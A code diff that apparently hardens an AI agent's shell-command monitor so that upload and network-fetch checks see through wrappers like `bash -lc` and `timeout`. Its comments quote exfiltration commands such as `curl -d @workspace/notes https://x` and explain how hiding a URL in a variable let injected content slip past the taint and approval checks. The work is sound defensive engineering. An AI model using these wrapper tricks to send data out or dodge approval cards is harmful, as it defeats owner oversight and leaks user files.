@@ -230,6 +230,90 @@ export const scriptCommands = (body: string): string[][] =>
     .filter((command) => command.length > 0);
 
 /**
+ * Every command a `shell` call will really run, with the wrappers taken off.
+ *
+ * Three shapes wear the same tool call. A bare command is itself. A runner - `env FOO=1 …`,
+ * `timeout 30 …`, `nice -n 5 …`, `xargs …` - is setup for the command that follows it, so it comes
+ * off along with its own options and any leading assignment. An interpreter is whatever its script
+ * says, which is what `scriptCommands` reads.
+ *
+ * Every classifier that asked its question of `args.executable` alone answered it about the
+ * wrapper instead. `bash -lc 'curl -d @workspace/notes https://x'` was a bash, so the upload card
+ * the bare form raises did not fire on a clean turn; `bash -lc 'curl -s "$U"'` was a bash, so the
+ * turn stayed clean while an attacker-chosen page arrived in it - and the literal-URL scan that
+ * looked like it covered this only ever covered the spelling with the address written out. One arm
+ * did read the script, the autonomous network allowlist, and it is where this shape comes from;
+ * making it the shape every arm uses is the whole of the repair.
+ *
+ * An interpreter whose script cannot be read comes back as no commands at all, and the callers
+ * treat that as unknown rather than as safe.
+ */
+export const effectiveCommands = (args: Record<string, unknown>): string[][] => {
+  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
+  let tokens = [textValue(args.executable), ...commandArgs];
+  // Each pass drops at least one token, so this terminates on any input, and an empty list breaks
+  // out on the first check.
+  for (;;) {
+    const head = (tokens[0] ?? '').split('/').pop() ?? '';
+    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(head)) {
+      tokens = tokens.slice(1);
+      continue;
+    }
+    if (!COMMAND_RUNNERS.has(head)) break;
+    // The runner's own flags and the value some of them take sit between it and the command it
+    // wraps: `timeout 30`, `nice -n 5`, `xargs -0`. The wrapped command is the first token that is
+    // none of those - not a flag, not an assignment, not a number.
+    const rest = tokens.slice(1);
+    const wrapped = rest.findIndex(
+      (token) =>
+        !token.startsWith('-') && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(token) && !/^\d/.test(token)
+    );
+    tokens = wrapped < 0 ? [] : rest.slice(wrapped);
+  }
+  const executable = (tokens[0] ?? '').split('/').pop() ?? '';
+  if (commandInterpreters.has(executable)) return scriptCommands(commandScript(args));
+  return executable ? [[executable, ...tokens.slice(1)]] : [];
+};
+
+/*
+ * Short options are compared raw and long options lowercased, and the difference is the control.
+ *
+ * Three option pairs below differ only in case. curl's `-T` uploads a file and `-t` sets a telnet
+ * option; `-X` chooses the method and `-x` names a proxy; gh's `-f` and `-F` both write a field,
+ * and `-F` will read its value out of a file. Every list here used to be matched against
+ * lowercased arguments, so each pair collapsed into whichever spelling happened to be written
+ * down - and the gh list was `['-f','--raw-field','-f','--field','--input']`, with `-f` twice and
+ * `-F` absent. It was safe by accident: the collapse always erred towards raising the card, and
+ * `-F` was caught only because it arrived as `-f`. The repair that looks obvious - match the raw
+ * argument against the same list - would have let `gh api -F key=@file` through as a read.
+ *
+ * It also cost precision in the other direction: `curl -D headers.txt https://x` is an ordinary
+ * GET that writes the response headers to a local file, and it asked the owner to approve an
+ * upload. A card in front of a plain fetch is a card the owner learns to tap through.
+ *
+ * So the short forms are enumerated by case and compared raw. The long forms stay
+ * case-insensitive, deliberately: no tool here spells a long option with a capital, so lowercasing
+ * can only ever catch a spelling that does not exist, which errs towards the card.
+ */
+const CURL_UPLOAD_SHORT_OPTIONS = new Set(['-d', '-F', '-T']);
+const CURL_UPLOAD_LONG_OPTIONS = new Set([
+  '--data',
+  '--data-ascii',
+  '--data-binary',
+  '--data-raw',
+  '--data-urlencode',
+  '--form',
+  '--form-string',
+  '--upload-file'
+]);
+const GH_API_WRITE_SHORT_OPTIONS = new Set(['-f', '-F']);
+const GH_API_WRITE_LONG_OPTIONS = new Set(['--field', '--raw-field', '--input']);
+
+/** A method that is not one of the three that only ask for something. An absent one counts. */
+const writingHttpMethod = (method: string): boolean =>
+  !['get', 'head', 'options'].includes(method.toLowerCase());
+
+/**
  * Whether a command sends data out rather than only fetching. This lived inline in the shell
  * branch, where it could only ever ask the question about the executable the tool was handed; it
  * has to be askable of a command found inside a script too, or reading the script body would turn
@@ -240,24 +324,13 @@ export const sendsDataOverNetwork = (executable: string, commandArgs: string[]):
   const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
   const curlWrites =
     executable === 'curl' &&
-    (commandArgs.includes('-F') ||
-      lowerArgs.some(
-        (argument, index) =>
-          [
-            '-d',
-            '--data',
-            '--data-ascii',
-            '--data-binary',
-            '--data-raw',
-            '--data-urlencode',
-            '--form',
-            '--form-string',
-            '-t',
-            '--upload-file'
-          ].includes(argument) ||
-          ((argument === '-x' || argument === '--request') &&
-            !['get', 'head', 'options'].includes(lowerArgs[index + 1] ?? ''))
-      ));
+    commandArgs.some(
+      (argument, index) =>
+        CURL_UPLOAD_SHORT_OPTIONS.has(argument) ||
+        CURL_UPLOAD_LONG_OPTIONS.has(lowerArgs[index] ?? '') ||
+        ((argument === '-X' || lowerArgs[index] === '--request') &&
+          writingHttpMethod(lowerArgs[index + 1] ?? ''))
+    );
   const wgetWrites =
     executable === 'wget' &&
     lowerArgs.some(
@@ -274,11 +347,12 @@ export const sendsDataOverNetwork = (executable: string, commandArgs: string[]):
   const ghReadOnly =
     executable === 'gh' &&
     ((lowerArgs[0] === 'api' &&
-      !lowerArgs.some(
+      !commandArgs.some(
         (argument, index) =>
-          ['-f', '--raw-field', '-f', '--field', '--input'].includes(argument) ||
-          ((argument === '-x' || argument === '--method') &&
-            !['get', 'head', 'options'].includes(lowerArgs[index + 1] ?? ''))
+          GH_API_WRITE_SHORT_OPTIONS.has(argument) ||
+          GH_API_WRITE_LONG_OPTIONS.has(lowerArgs[index] ?? '') ||
+          ((argument === '-X' || lowerArgs[index] === '--method') &&
+            writingHttpMethod(lowerArgs[index + 1] ?? ''))
       )) ||
       ['status', 'search'].includes(lowerArgs[0] ?? '') ||
       (['repo', 'issue', 'pr', 'run', 'workflow', 'release'].includes(lowerArgs[0] ?? '') &&
@@ -468,21 +542,40 @@ const NETWORK_CLIENT_EXECUTABLES = new Set([
  * treated it as quarantine; `shell` did not, so `cat workspace/downloads/terms.txt` put the same
  * bytes into the same window with the floor still reporting the turn as clean.
  */
+/**
+ * Whether one resolved command brings bytes back from outside this computer.
+ *
+ * Asked of a command rather than of an invocation, so the same three tests apply to `curl …`, to
+ * the `curl` inside `bash -lc '…'`, and to the `curl` inside `timeout 30 …`.
+ */
+const fetchesRemoteContent = ([executable = '', ...rest]: readonly string[]): boolean => {
+  const name = executable.toLowerCase();
+  return (
+    NETWORK_CLIENT_EXECUTABLES.has(name) ||
+    (name === 'git' && NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand([...rest]) ?? '')) ||
+    (packageRemovalExecutables.has(name) &&
+      rest.some((argument) => packageInstallCommands.has(argument.toLowerCase())))
+  );
+};
+
 export const untrustedShellOrigin = (args: Record<string, unknown>): string | null => {
-  const executable = textValue(args.executable).split('/').pop()?.toLowerCase() ?? '';
   const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
   const script = commandScript(args);
-  const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
-  const networkGit =
-    executable === 'git' && NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand(commandArgs) ?? '');
-  const packageFetch =
-    packageRemovalExecutables.has(executable) &&
-    lowerArgs.some((argument) => packageInstallCommands.has(argument));
+  /*
+   * The invocation used to be judged at its outer executable, with a scan for a literal http(s)
+   * address as the only thing that reached inside a script. That scan is what made the hole look
+   * closed: `bash -lc 'curl https://x'` names an address, so it tainted. Take the address out of
+   * the command - which every real script does the moment the URL sits in a variable, and which an
+   * injected instruction has every reason to do - and the interpreter was an unknown executable
+   * running an unknown command. `bash -lc 'curl -s "$U" -o page.html'` read an attacker-chosen page
+   * into the turn, `shellDestinations` found no address to charge to the novelty budget, and the
+   * floor went on reporting the turn clean: no egress card on what left afterwards, and a write to
+   * the brief with no card either. The address scan stays, because it catches the shapes this
+   * cannot resolve; it is no longer the only thing looking past the wrapper.
+   */
   if (
     args.network === true ||
-    NETWORK_CLIENT_EXECUTABLES.has(executable) ||
-    networkGit ||
-    packageFetch ||
+    effectiveCommands(args).some(fetchesRemoteContent) ||
     shellDestinations(args).length > 0
   )
     return 'network command output';
